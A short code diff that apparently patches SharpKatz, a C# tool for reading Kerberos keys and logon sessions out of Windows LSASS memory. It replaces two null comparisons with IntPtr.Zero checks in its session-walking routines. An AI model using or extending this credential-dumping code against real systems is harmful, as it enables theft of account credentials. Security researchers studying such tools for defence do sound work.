@@ -346,7 +346,7 @@ namespace SharpKatz.Module
 
         private static void WalkAVLTables(ref IntPtr hLsass, IntPtr pElement, List<byte[]> klogonlist, OSVersionHelper oshelper, byte[] iv, byte[] aeskey, byte[] deskey, List<Logon> logonlist)
         {
-            if (pElement == null)
+            if (pElement == IntPtr.Zero)
                 return;
 
             byte[] entryBytes = Utility.ReadFromLsass(ref hLsass, pElement, Convert.ToUInt64(Marshal.SizeOf(typeof(RTL_AVL_TABLE))));
@@ -453,7 +453,7 @@ namespace SharpKatz.Module
 
             IntPtr pKeyList = new IntPtr(BitConverter.ToInt64(krbrLogonSession, oshelper.KerberosLogonSessionKeyListOffset));
 
-            if (pKeyList == null)
+            if (pKeyList == IntPtr.Zero)
                 return;
 
             LUID luid = Utility.ReadStruct<LUID>(Utility.GetBytes(krbrLogonSession, oshelper.KerberosSessionLocallyUniqueIdentifierOffset, Marshal.SizeOf(typeof(LUID))));
